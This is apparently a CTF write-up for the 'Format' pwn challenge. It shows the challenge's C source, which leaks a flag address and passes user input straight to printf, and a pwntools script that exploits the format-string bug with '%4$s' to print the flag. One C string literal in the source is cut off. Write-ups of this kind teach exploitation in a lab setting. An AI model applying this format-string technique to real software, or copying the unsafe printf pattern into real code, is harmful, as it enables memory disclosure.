---

title: Format pcc.nccs_final 2022

author: megachar0x01

date: 2022-08-08

categories: [Pwn, i386, ctf]

---

### Purpose : Get The Flag



Checking binary security measures.


<img src="https://i.imgur.com/bMNUHIG.png" alt="img_1">

    
  
Source Code is given. Reading through it we can see that flag is loaded and saved to the flag variable on the stack.Pointer to flag variable is given to us. Later it takes input that is vulnerable to format string. We have to just pass the pointer of flag char given by us and use "%s" to print it


```c

#include <stdio.h>
#include <string.h>

int main(int argc, char* argv) {

        setbuf(stdout, NULL);
        setbuf(stdin, NULL);

        FILE* fptr = fopen("flag.txt", "r");
        char flag[50];

        if (fptr == NULL) {
                printf("\nError reading flag from the file. Please contact TheFlash2k...\n>
                exit(-1);
        }
        fscanf(fptr, "%s", flag);
        fclose(fptr);

        printf("Address of Flag: %x\n", &flag);

        const int SIZE = 50;
        char name[SIZE];
        bzero(name, 0x00);
        printf("Please enter your name: ");
        fgets(name, SIZE, stdin);
        printf("Welcome, %s\n", name);
        printf("Here's some messages that were left for you: ");
        printf(name);
        printf("\n");

        return 0;
}


```

Now it's time to exploit this binary. 

```python
#!/usr/bin/python3
from pwn import *
import struct

def start(argv=[], *a, **kw):
    if args.GDB:  
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)


exe = './format'; elf = context.binary = ELF(exe, checksec=False);

io = start()
io.recvuntil(b": ")
leak_add = int(io.recvline().strip(b"\n"),16)
payload = b""
payload += p32(leak_add)
payload += b"%4$s"
io.sendlineafter(b"Please enter your name:",payload)
io.recvuntil(b"you: ")
print(io.recvline().strip(b"\n")[4:])
io.close()

```
<img src="https://i.imgur.com/rzjYzYe.png" alt="img_1">
